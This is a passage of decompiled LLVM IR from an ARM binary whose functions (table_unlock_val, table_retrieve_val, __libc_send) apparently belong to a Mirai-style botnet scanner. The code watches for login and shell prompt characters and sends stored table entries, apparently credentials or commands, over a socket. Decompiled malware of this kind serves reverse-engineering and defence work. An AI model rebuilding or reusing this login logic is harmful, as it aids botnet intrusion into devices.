  %v8_1108c = icmp eq i8 %v3_11084, 58
  store i1 %v8_1108c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1108c, label %dec_label_pc_11094, label %dec_label_pc_11060

dec_label_pc_11094:                               ; preds = %dec_label_pc_11084, %bb394, %dec_label_pc_11070, %dec_label_pc_11068, %dec_label_pc_11060, %dec_label_pc_1104c, %dec_label_pc_11028, %dec_label_pc_11044, %dec_label_pc_1103c, %bb393
  %v0_11098 = phi i32 [ %v1_1101c, %dec_label_pc_1104c ], [ %v1_1101c, %dec_label_pc_11028 ], [ %v1_1101c, %dec_label_pc_11044 ], [ %v1_1101c, %dec_label_pc_1103c ], [ %v1_1101c, %bb393 ], [ %v1_1107c, %dec_label_pc_11060 ], [ %v1_1107c, %dec_label_pc_11068 ], [ %v1_1107c, %dec_label_pc_11070 ], [ %v1_1107c, %bb394 ], [ %v1_1107c, %dec_label_pc_11084 ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11098 = add i32 %v0_11098, 1
  store i32 %v1_11098, i32* @r8, align 4
  %v1_1109c = call i32 @table_unlock_val(i32 22)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_110ac = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_110ac, i32* %r0.global-to-local, align 4
  %v3_110b0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_110b0, i32* %r2.global-to-local, align 4
  store i32 %v3_110ac, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110bc = load i32, i32* @r6, align 4
  %v1_110bc = add i32 %v0_110bc, 4
  %v2_110bc = inttoptr i32 %v1_110bc to i32*
  %v3_110bc = load i32, i32* %v2_110bc, align 4
  store i32 %v3_110bc, i32* %r0.global-to-local, align 4
  %v4_110c0 = call i32 @__libc_send(i32 %v3_110bc, i32 %v3_110ac, i32 %v3_110b0, i32 16384)
  store i32 %v4_110c0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_110d0 = load i32, i32* @r6, align 4
  %v1_110d0 = add i32 %v0_110d0, 4
  %v2_110d0 = inttoptr i32 %v1_110d0 to i32*
  %v3_110d0 = load i32, i32* %v2_110d0, align 4
  store i32 %v3_110d0, i32* %r0.global-to-local, align 4
  %v4_110d4 = call i32 @__libc_send(i32 %v3_110d0, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_110dc = call i32 @table_lock_val(i32 22)
  store i32 %v1_110dc, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_110e4 = load i32, i32* @r6, align 4
  %v2_110e4 = add i32 %v1_110e4, 12
  %v3_110e4 = inttoptr i32 %v2_110e4 to i32*
  store i32 7, i32* %v3_110e4, align 4
  br label %dec_label_pc_10d28

dec_label_pc_110ec:                               ; preds = %dec_label_pc_10c0c
  %v1_110ec = add i32 %v0_10c0c, 24
  %v2_110ec = inttoptr i32 %v1_110ec to i32*
  %v3_110ec = load i32, i32* %v2_110ec, align 4
  store i32 %v3_110ec, i32* %r2.global-to-local, align 4
  %v1_110f0 = add i32 %v3_110ec, -1
  store i32 %v1_110f0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110f4 = icmp eq i32 %v1_110f0, 0
  store i1 %v2_110f4, i1* %cpsr_z.global-to-local, align 1
  %tmp395 = icmp slt i32 %v1_110f0, 1
  br i1 %tmp395, label %dec_label_pc_10b8cthread-pre-split.thread, label %dec_label_pc_110fc

dec_label_pc_110fc:                               ; preds = %dec_label_pc_110ec
  %v2_110fc = add i32 %v1_110f0, %v0_10c0c
  store i32 %v2_110fc, i32* %r3.global-to-local, align 4
  %v1_11100 = add i32 %v2_110fc, 28
  %v2_11100 = inttoptr i32 %v1_11100 to i8*
  %v3_11100 = load i8, i8* %v2_11100, align 1
  %v4_11100 = zext i8 %v3_11100 to i32
  store i32 %v4_11100, i32* %r3.global-to-local, align 4
  %v2_11104 = icmp ugt i8 %v3_11100, 61
  store i1 %v2_11104, i1* %cpsr_c.global-to-local, align 1
  %v7_11104 = icmp eq i8 %v3_11100, 62
  store i1 %v7_11104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11104, label %dec_label_pc_11168, label %bb396

bb396:                                            ; preds = %dec_label_pc_110fc
  %v3_11108 = icmp ugt i8 %v3_11100, 57
  store i1 %v3_11108, i1* %cpsr_c.global-to-local, align 1
  %v8_11108 = icmp eq i8 %v3_11100, 58
  store i1 %v8_11108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11108, label %dec_label_pc_11168, label %dec_label_pc_11110

dec_label_pc_11110:                               ; preds = %bb396
  %v2_11110 = icmp ugt i8 %v3_11100, 35
  store i1 %v2_11110, i1* %cpsr_c.global-to-local, align 1
  %v7_11110 = icmp eq i8 %v3_11100, 36
  store i1 %v7_11110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11110, label %dec_label_pc_11168, label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_11110
  %v2_11118 = icmp ugt i8 %v3_11100, 34
  store i1 %v2_11118, i1* %cpsr_c.global-to-local, align 1
  %v7_11118 = icmp eq i8 %v3_11100, 35
  store i1 %v7_11118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11118, label %dec_label_pc_11168, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %dec_label_pc_11118
  %v2_11120 = icmp ugt i8 %v3_11100, 36
  store i1 %v2_11120, i1* %cpsr_c.global-to-local, align 1
  %v7_11120 = icmp eq i8 %v3_11100, 37
  store i1 %v7_11120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11120, label %dec_label_pc_11168, label %dec_label_pc_11150.preheader

dec_label_pc_11150.preheader:                     ; preds = %dec_label_pc_11120
  %v3_11124 = add i32 %v0_10c0c, 28
  %v2_11128 = add i32 %v3_11124, %v3_110ec
  store i32 %v2_11128, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11150

dec_label_pc_11134:                               ; preds = %bb397
  %v2_11134 = icmp ugt i8 %v3_11158, 35
  store i1 %v2_11134, i1* %cpsr_c.global-to-local, align 1
  %v7_11134 = icmp eq i8 %v3_11158, 36
  store i1 %v7_11134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11134, label %dec_label_pc_11168, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11134
  %v2_1113c = icmp ugt i8 %v3_11158, 34
  store i1 %v2_1113c, i1* %cpsr_c.global-to-local, align 1
  %v7_1113c = icmp eq i8 %v3_11158, 35
  store i1 %v7_1113c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1113c, label %dec_label_pc_11168, label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %dec_label_pc_1113c
  %v2_11144 = icmp ugt i8 %v3_11158, 36
  store i1 %v2_11144, i1* %cpsr_c.global-to-local, align 1
  %v7_11144 = icmp eq i8 %v3_11158, 37
  store i1 %v7_11144, i1* %cpsr_z.global-to-local, align 1
  %v1_11148 = add i32 %v0_11148, -1
  store i32 %v1_11148, i32* %r3.global-to-local, align 4
  br i1 %v7_11144, label %dec_label_pc_11168, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11150.preheader, %dec_label_pc_11144
  %v0_11148 = phi i32 [ %v2_11128, %dec_label_pc_11150.preheader ], [ %v1_11148, %dec_label_pc_11144 ]
  %v0_11150 = phi i32 [ %v1_110f0, %dec_label_pc_11150.preheader ], [ %v1_11150, %dec_label_pc_11144 ]
  %v1_11150 = add i32 %v0_11150, -1
  store i32 %v1_11150, i32* %r1.global-to-local, align 4
  %v2_11150 = icmp ne i32 %v0_11150, 0
  store i1 %v2_11150, i1* %cpsr_c.global-to-local, align 1
  %v7_11150 = icmp eq i32 %v0_11150, 1
  store i1 %v7_11150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11150, label %dec_label_pc_10b8cthread-pre-split.thread514, label %dec_label_pc_11158

dec_label_pc_11158:                               ; preds = %dec_label_pc_11150
  %v1_11158 = add i32 %v0_11148, -2
  %v2_11158 = inttoptr i32 %v1_11158 to i8*
  %v3_11158 = load i8, i8* %v2_11158, align 1
  %v4_11158 = zext i8 %v3_11158 to i32
  store i32 %v4_11158, i32* %r2.global-to-local, align 4
  %v2_1115c = icmp ugt i8 %v3_11158, 61
  store i1 %v2_1115c, i1* %cpsr_c.global-to-local, align 1
  %v7_1115c = icmp eq i8 %v3_11158, 62
  store i1 %v7_1115c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1115c, label %dec_label_pc_11168, label %bb397

bb397:                                            ; preds = %dec_label_pc_11158
  %v3_11160 = icmp ugt i8 %v3_11158, 57
  store i1 %v3_11160, i1* %cpsr_c.global-to-local, align 1
  %v8_11160 = icmp eq i8 %v3_11158, 58
  store i1 %v8_11160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11160, label %dec_label_pc_11168, label %dec_label_pc_11134

dec_label_pc_11168:                               ; preds = %dec_label_pc_11158, %bb397, %dec_label_pc_11144, %dec_label_pc_1113c, %dec_label_pc_11134, %dec_label_pc_11120, %dec_label_pc_110fc, %dec_label_pc_11118, %dec_label_pc_11110, %bb396
  %v0_1116c = phi i32 [ %v1_110f0, %dec_label_pc_11120 ], [ %v1_110f0, %dec_label_pc_110fc ], [ %v1_110f0, %dec_label_pc_11118 ], [ %v1_110f0, %dec_label_pc_11110 ], [ %v1_110f0, %bb396 ], [ %v1_11150, %dec_label_pc_11134 ], [ %v1_11150, %dec_label_pc_1113c ], [ %v1_11150, %dec_label_pc_11144 ], [ %v1_11150, %bb397 ], [ %v1_11150, %dec_label_pc_11158 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1116c = add i32 %v0_1116c, 1
  store i32 %v1_1116c, i32* @r8, align 4
  %v1_11170 = call i32 @table_unlock_val(i32 23)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_11180 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_11180, i32* %r0.global-to-local, align 4
  %v3_11184 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11184, i32* %r2.global-to-local, align 4
  store i32 %v3_11180, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11190 = load i32, i32* @r6, align 4
  %v1_11190 = add i32 %v0_11190, 4
  %v2_11190 = inttoptr i32 %v1_11190 to i32*
  %v3_11190 = load i32, i32* %v2_11190, align 4
  store i32 %v3_11190, i32* %r0.global-to-local, align 4
  %v4_11194 = call i32 @__libc_send(i32 %v3_11190, i32 %v3_11180, i32 %v3_11184, i32 16384)
  store i32 %v4_11194, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_111a4 = load i32, i32* @r6, align 4
  %v1_111a4 = add i32 %v0_111a4, 4
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  store i32 %v3_111a4, i32* %r0.global-to-local, align 4
  %v4_111a8 = call i32 @__libc_send(i32 %v3_111a4, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_111b0 = call i32 @table_lock_val(i32 23)
  store i32 %v1_111b0, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_111b8 = load i32, i32* @r6, align 4
  %v2_111b8 = add i32 %v1_111b8, 12
  %v3_111b8 = inttoptr i32 %v2_111b8 to i32*
  store i32 9, i32* %v3_111b8, align 4
  br label %dec_label_pc_10d28

dec_label_pc_111c0:                               ; preds = %dec_label_pc_10c0c
  %v1_111c0 = add i32 %v0_10c0c, 24
  %v2_111c0 = inttoptr i32 %v1_111c0 to i32*
  %v3_111c0 = load i32, i32* %v2_111c0, align 4
  store i32 %v3_111c0, i32* %r2.global-to-local, align 4
  %v1_111c4 = add i32 %v3_111c0, -1
  store i32 %v1_111c4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111c8 = icmp eq i32 %v1_111c4, 0
  store i1 %v2_111c8, i1* %cpsr_z.global-to-local, align 1
  %tmp398 = icmp slt i32 %v1_111c4, 1
  br i1 %tmp398, label %dec_label_pc_10b8cthread-pre-split.thread, label %dec_label_pc_111d0

dec_label_pc_111d0:                               ; preds = %dec_label_pc_111c0
  %v2_111d0 = add i32 %v1_111c4, %v0_10c0c
  store i32 %v2_111d0, i32* %r3.global-to-local, align 4
  %v1_111d4 = add i32 %v2_111d0, 28
  %v2_111d4 = inttoptr i32 %v1_111d4 to i8*
  %v3_111d4 = load i8, i8* %v2_111d4, align 1
  %v4_111d4 = zext i8 %v3_111d4 to i32
  store i32 %v4_111d4, i32* %r3.global-to-local, align 4
  %v2_111d8 = icmp ugt i8 %v3_111d4, 61
  store i1 %v2_111d8, i1* %cpsr_c.global-to-local, align 1
  %v7_111d8 = icmp eq i8 %v3_111d4, 62
  store i1 %v7_111d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111d8, label %dec_label_pc_1123c, label %bb399

bb399:                                            ; preds = %dec_label_pc_111d0
  %v3_111dc = icmp ugt i8 %v3_111d4, 57
  store i1 %v3_111dc, i1* %cpsr_c.global-to-local, align 1
  %v8_111dc = icmp eq i8 %v3_111d4, 58
  store i1 %v8_111dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_111dc, label %dec_label_pc_1123c, label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %bb399
  %v2_111e4 = icmp ugt i8 %v3_111d4, 35
  store i1 %v2_111e4, i1* %cpsr_c.global-to-local, align 1
  %v7_111e4 = icmp eq i8 %v3_111d4, 36
  store i1 %v7_111e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111e4, label %dec_label_pc_1123c, label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %dec_label_pc_111e4
  %v2_111ec = icmp ugt i8 %v3_111d4, 34
  store i1 %v2_111ec, i1* %cpsr_c.global-to-local, align 1
  %v7_111ec = icmp eq i8 %v3_111d4, 35
  store i1 %v7_111ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111ec, label %dec_label_pc_1123c, label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111ec
  %v2_111f4 = icmp ugt i8 %v3_111d4, 36
  store i1 %v2_111f4, i1* %cpsr_c.global-to-local, align 1
  %v7_111f4 = icmp eq i8 %v3_111d4, 37
  store i1 %v7_111f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111f4, label %dec_label_pc_1123c, label %dec_label_pc_11224.preheader

dec_label_pc_11224.preheader:                     ; preds = %dec_label_pc_111f4
  %v3_111f8 = add i32 %v0_10c0c, 28
  %v2_111fc = add i32 %v3_111f8, %v3_111c0
  store i32 %v2_111fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_11208:                               ; preds = %bb400
  %v2_11208 = icmp ugt i8 %v3_1122c, 35
  store i1 %v2_11208, i1* %cpsr_c.global-to-local, align 1
  %v7_11208 = icmp eq i8 %v3_1122c, 36
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11208, label %dec_label_pc_1123c, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_11208
  %v2_11210 = icmp ugt i8 %v3_1122c, 34
  store i1 %v2_11210, i1* %cpsr_c.global-to-local, align 1
  %v7_11210 = icmp eq i8 %v3_1122c, 35
  store i1 %v7_11210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11210, label %dec_label_pc_1123c, label %dec_label_pc_11218

dec_label_pc_11218:                               ; preds = %dec_label_pc_11210
  %v2_11218 = icmp ugt i8 %v3_1122c, 36
  store i1 %v2_11218, i1* %cpsr_c.global-to-local, align 1
  %v7_11218 = icmp eq i8 %v3_1122c, 37
  store i1 %v7_11218, i1* %cpsr_z.global-to-local, align 1
  %v1_1121c = add i32 %v0_1121c, -1
  store i32 %v1_1121c, i32* %r3.global-to-local, align 4
  br i1 %v7_11218, label %dec_label_pc_1123c, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_11224.preheader, %dec_label_pc_11218
  %v0_1121c = phi i32 [ %v2_111fc, %dec_label_pc_11224.preheader ], [ %v1_1121c, %dec_label_pc_11218 ]
  %v0_11224 = phi i32 [ %v1_111c4, %dec_label_pc_11224.preheader ], [ %v1_11224, %dec_label_pc_11218 ]
  %v1_11224 = add i32 %v0_11224, -1
  store i32 %v1_11224, i32* %r1.global-to-local, align 4
  %v2_11224 = icmp ne i32 %v0_11224, 0
  store i1 %v2_11224, i1* %cpsr_c.global-to-local, align 1
  %v7_11224 = icmp eq i32 %v0_11224, 1
  store i1 %v7_11224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11224, label %dec_label_pc_10b8cthread-pre-split.thread514, label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11224
  %v1_1122c = add i32 %v0_1121c, -2
  %v2_1122c = inttoptr i32 %v1_1122c to i8*
  %v3_1122c = load i8, i8* %v2_1122c, align 1
  %v4_1122c = zext i8 %v3_1122c to i32
  store i32 %v4_1122c, i32* %r2.global-to-local, align 4
  %v2_11230 = icmp ugt i8 %v3_1122c, 61
  store i1 %v2_11230, i1* %cpsr_c.global-to-local, align 1
  %v7_11230 = icmp eq i8 %v3_1122c, 62
  store i1 %v7_11230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11230, label %dec_label_pc_1123c, label %bb400

bb400:                                            ; preds = %dec_label_pc_1122c
  %v3_11234 = icmp ugt i8 %v3_1122c, 57
  store i1 %v3_11234, i1* %cpsr_c.global-to-local, align 1
  %v8_11234 = icmp eq i8 %v3_1122c, 58
  store i1 %v8_11234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11234, label %dec_label_pc_1123c, label %dec_label_pc_11208

dec_label_pc_1123c:                               ; preds = %dec_label_pc_1122c, %bb400, %dec_label_pc_11218, %dec_label_pc_11210, %dec_label_pc_11208, %dec_label_pc_111f4, %dec_label_pc_111d0, %dec_label_pc_111ec, %dec_label_pc_111e4, %bb399
  %v0_11240 = phi i32 [ %v1_111c4, %dec_label_pc_111f4 ], [ %v1_111c4, %dec_label_pc_111d0 ], [ %v1_111c4, %dec_label_pc_111ec ], [ %v1_111c4, %dec_label_pc_111e4 ], [ %v1_111c4, %bb399 ], [ %v1_11224, %dec_label_pc_11208 ], [ %v1_11224, %dec_label_pc_11210 ], [ %v1_11224, %dec_label_pc_11218 ], [ %v1_11224, %bb400 ], [ %v1_11224, %dec_label_pc_1122c ]
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11240 = add i32 %v0_11240, 1
  store i32 %v1_11240, i32* @r8, align 4
  %v1_11244 = call i32 @table_unlock_val(i32 21)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11254 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-60)
  store i32 %v3_11254, i32* %r0.global-to-local, align 4
  %v3_11258 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11258, i32* %r2.global-to-local, align 4
  store i32 %v3_11254, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11264 = load i32, i32* @r6, align 4
  %v1_11264 = add i32 %v0_11264, 4
  %v2_11264 = inttoptr i32 %v1_11264 to i32*
  %v3_11264 = load i32, i32* %v2_11264, align 4
  store i32 %v3_11264, i32* %r0.global-to-local, align 4
  %v4_11268 = call i32 @__libc_send(i32 %v3_11264, i32 %v3_11254, i32 %v3_11258, i32 16384)
  store i32 %v4_11268, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11278 = load i32, i32* @r6, align 4
  %v1_11278 = add i32 %v0_11278, 4
  %v2_11278 = inttoptr i32 %v1_11278 to i32*
  %v3_11278 = load i32, i32* %v2_11278, align 4
  store i32 %v3_11278, i32* %r0.global-to-local, align 4
  %v4_1127c = call i32 @__libc_send(i32 %v3_11278, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11284 = call i32 @table_lock_val(i32 21)
  store i32 %v1_11284, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_1128c = load i32, i32* @r6, align 4
  %v2_1128c = add i32 %v1_1128c, 12
  %v3_1128c = inttoptr i32 %v2_1128c to i32*
  store i32 6, i32* %v3_1128c, align 4
  br label %dec_label_pc_10d28

dec_label_pc_11294:                               ; preds = %dec_label_pc_10c0c
  %v1_11294 = add i32 %v0_10c0c, 24
  %v2_11294 = inttoptr i32 %v1_11294 to i32*
  %v3_11294 = load i32, i32* %v2_11294, align 4
  store i32 %v3_11294, i32* %r1.global-to-local, align 4
  %v1_11298 = add i32 %v3_11294, -1
  store i32 %v1_11298, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1129c = icmp eq i32 %v1_11298, 0
  store i1 %v2_1129c, i1* %cpsr_z.global-to-local, align 1
  %tmp401 = icmp slt i32 %v1_11298, 1
  br i1 %tmp401, label %dec_label_pc_11310, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_11294
  %v2_112a4 = add i32 %v1_11298, %v0_10c0c
  store i32 %v2_112a4, i32* %r3.global-to-local, align 4
  %v1_112a8 = add i32 %v2_112a4, 28
  %v2_112a8 = inttoptr i32 %v1_112a8 to i8*
  %v3_112a8 = load i8, i8* %v2_112a8, align 1
  %v4_112a8 = zext i8 %v3_112a8 to i32
  store i32 %v4_112a8, i32* %r3.global-to-local, align 4
  %v2_112ac = icmp ugt i8 %v3_112a8, 61
  store i1 %v2_112ac, i1* %cpsr_c.global-to-local, align 1
  %v7_112ac = icmp eq i8 %v3_112a8, 62
  store i1 %v7_112ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112ac, label %dec_label_pc_11518, label %bb402

bb402:                                            ; preds = %dec_label_pc_112a4
  %v3_112b0 = icmp ugt i8 %v3_112a8, 57
  store i1 %v3_112b0, i1* %cpsr_c.global-to-local, align 1
  %v8_112b0 = icmp eq i8 %v3_112a8, 58
  store i1 %v8_112b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112b0, label %dec_label_pc_11518, label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %bb402
  %v2_112b8 = icmp ugt i8 %v3_112a8, 35
  store i1 %v2_112b8, i1* %cpsr_c.global-to-local, align 1
  %v7_112b8 = icmp eq i8 %v3_112a8, 36
  store i1 %v7_112b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112b8, label %dec_label_pc_11518, label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_112b8
  %v2_112c0 = icmp ugt i8 %v3_112a8, 34
  store i1 %v2_112c0, i1* %cpsr_c.global-to-local, align 1
  %v7_112c0 = icmp eq i8 %v3_112a8, 35
  store i1 %v7_112c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112c0, label %dec_label_pc_11518, label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %dec_label_pc_112c0
  %v2_112c8 = icmp ugt i8 %v3_112a8, 36
  store i1 %v2_112c8, i1* %cpsr_c.global-to-local, align 1
  %v7_112c8 = icmp eq i8 %v3_112a8, 37
  store i1 %v7_112c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112c8, label %dec_label_pc_11518, label %dec_label_pc_11308.preheader

dec_label_pc_11308.preheader:                     ; preds = %dec_label_pc_112c8
  %v3_112cc = add i32 %v0_10c0c, 28
  %v2_112d0 = add i32 %v3_112cc, %v3_11294
  store i32 %v2_112d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11308

dec_label_pc_112dc:                               ; preds = %dec_label_pc_11308
  %v1_112dc = add i32 %v0_11300, -2
  %v2_112dc = inttoptr i32 %v1_112dc to i8*
  %v3_112dc = load i8, i8* %v2_112dc, align 1
  %v4_112dc = zext i8 %v3_112dc to i32
  store i32 %v4_112dc, i32* %r2.global-to-local, align 4
  %v2_112e0 = icmp ugt i8 %v3_112dc, 61
  store i1 %v2_112e0, i1* %cpsr_c.global-to-local, align 1
  %v7_112e0 = icmp eq i8 %v3_112dc, 62
  store i1 %v7_112e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e0, label %dec_label_pc_11518, label %bb403

bb403:                                            ; preds = %dec_label_pc_112dc
  %v3_112e4 = icmp ugt i8 %v3_112dc, 57
  store i1 %v3_112e4, i1* %cpsr_c.global-to-local, align 1
  %v8_112e4 = icmp eq i8 %v3_112dc, 58
  store i1 %v8_112e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112e4, label %dec_label_pc_11518, label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %bb403
  %v2_112ec = icmp ugt i8 %v3_112dc, 35
  store i1 %v2_112ec, i1* %cpsr_c.global-to-local, align 1
  %v7_112ec = icmp eq i8 %v3_112dc, 36
  store i1 %v7_112ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112ec, label %dec_label_pc_11518, label %dec_label_pc_112f4

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112ec
  %v2_112f4 = icmp ugt i8 %v3_112dc, 34
  store i1 %v2_112f4, i1* %cpsr_c.global-to-local, align 1
  %v7_112f4 = icmp eq i8 %v3_112dc, 35
  store i1 %v7_112f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f4, label %dec_label_pc_11518, label %dec_label_pc_112fc

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112f4
  %v2_112fc = icmp ugt i8 %v3_112dc, 36
  store i1 %v2_112fc, i1* %cpsr_c.global-to-local, align 1
  %v7_112fc = icmp eq i8 %v3_112dc, 37
  store i1 %v7_112fc, i1* %cpsr_z.global-to-local, align 1
  %v1_11300 = add i32 %v0_11300, -1
  store i32 %v1_11300, i32* %r3.global-to-local, align 4
  br i1 %v7_112fc, label %dec_label_pc_11518, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %dec_label_pc_11308.preheader, %dec_label_pc_112fc
  %v0_11300 = phi i32 [ %v2_112d0, %dec_label_pc_11308.preheader ], [ %v1_11300, %dec_label_pc_112fc ]
  %v0_11308 = phi i32 [ %v1_11298, %dec_label_pc_11308.preheader ], [ %v1_11308, %dec_label_pc_112fc ]
  %v1_11308 = add i32 %v0_11308, -1
  store i32 %v1_11308, i32* %r0.global-to-local, align 4
  %v2_11308 = icmp ne i32 %v0_11308, 0
  store i1 %v2_11308, i1* %cpsr_c.global-to-local, align 1
  %v7_11308 = icmp eq i32 %v0_11308, 1
  store i1 %v7_11308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11308, label %dec_label_pc_11310, label %dec_label_pc_112dc

dec_label_pc_11310:                               ; preds = %dec_label_pc_11308, %dec_label_pc_11294
  %v0_11310 = load i32, i32* @fp, align 4
  store i32 %v0_11310, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b680.332 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_1131c = call i32 @util_memsearch(i32 %v0_11310, i32 %v3_11294, i32 ptrtoint ([5 x i8]* @global_var_1b680.332 to i32), i32 4)
  store i32 %v5_1131c, i32* %r0.global-to-local, align 4
  %v2_11320 = icmp eq i32 %v5_1131c, -1
  store i1 %v2_11320, i1* %cpsr_c.global-to-local, align 1
  %v7_11320 = icmp eq i32 %v5_1131c, -1
  store i1 %v7_11320, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1131c, i32* @r8, align 4
  br i1 %v7_11320, label %dec_label_pc_118e4, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_118e4, %dec_label_pc_11310
  %v0_1132c = phi i32 [ %v5_118f4, %dec_label_pc_118e4 ], [ %v5_1131c, %dec_label_pc_11310 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1132c = icmp eq i32 %v0_1132c, 0
  store i1 %v2_1132c, i1* %cpsr_z.global-to-local, align 1
  %v5_11330 = icmp sgt i32 %v0_1132c, 0
  br i1 %v5_11330, label %dec_label_pc_1132c.dec_label_pc_1151c_crit_edge, label %dec_label_pc_11334

dec_label_pc_1132c.dec_label_pc_1151c_crit_edge:  ; preds = %dec_label_pc_1132c
  %v0_1151c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1151c

dec_label_pc_11334:                               ; preds = %dec_label_pc_11494, %bb411, %dec_label_pc_113c8, %dec_label_pc_1132c, %dec_label_pc_115dc, %dec_label_pc_11558, %dec_label_pc_1151c, %dec_label_pc_11664
